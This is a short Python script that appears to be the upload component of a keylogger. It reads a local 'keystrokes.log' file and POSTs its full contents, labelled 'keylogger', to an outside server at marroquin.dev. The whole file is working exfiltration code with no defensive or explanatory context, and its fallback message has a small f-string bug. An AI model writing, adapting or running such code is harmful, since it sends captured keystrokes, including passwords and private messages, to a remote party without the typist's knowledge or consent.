from urllib import request
import json
import os

FILE_NAME = "keystrokes.log"

if os.path.exists(FILE_NAME):

  file = open(FILE_NAME, "r").read()

  newConditions = {
    "data": file,
    "type": "keylogger"
  }

  data = json.dumps(newConditions).encode('utf8')

  req = request.Request(
    "https://marroquin.dev/api/tests",
    data=data,
    headers={
      'content-type': 'application/json'
    }
  )

  resp = request.urlopen(req)

else:
  print("The file {FILE_NAME} doesn't exists")
